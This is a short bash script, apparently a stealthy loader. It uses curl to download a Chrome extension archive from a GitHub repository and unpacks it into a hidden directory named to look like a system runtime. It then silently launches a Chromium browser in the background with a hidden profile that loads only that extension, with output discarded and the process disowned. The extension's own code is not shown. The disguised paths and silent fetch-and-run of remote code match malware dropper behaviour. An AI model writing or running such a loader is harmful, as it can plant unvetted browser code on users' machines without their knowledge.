#!/usr/bin/env bash

set -euo pipefail

B="$HOME/.cache/.sys-runtime"
mkdir -p "$B"

ZIP="$B/.e.zip"
EXT_DIR="$B/Google-Chrome-Extension-main"
PROFILE_DIR="$B/.p"

curl -Ls \
  "https://github.com/school0102/Google-Chrome-Extension/archive/refs/heads/main.zip" \
  -o "$ZIP"

unzip -oq "$ZIP" -d "$B"
rm -f "$ZIP"

C=$(
    command -v google-chrome ||
    command -v chromium ||
    command -v chromium-browser ||
    true
)

if [ -z "$C" ]; then
    echo "Nenhum navegador Chromium encontrado."
    exit 1
fi

nohup "$C" \
    --user-data-dir="$PROFILE_DIR" \
    --disable-extensions-except="$EXT_DIR" \
    --load-extension="$EXT_DIR" \
    >/dev/null 2>&1 < /dev/null &

disown || true

exit 0
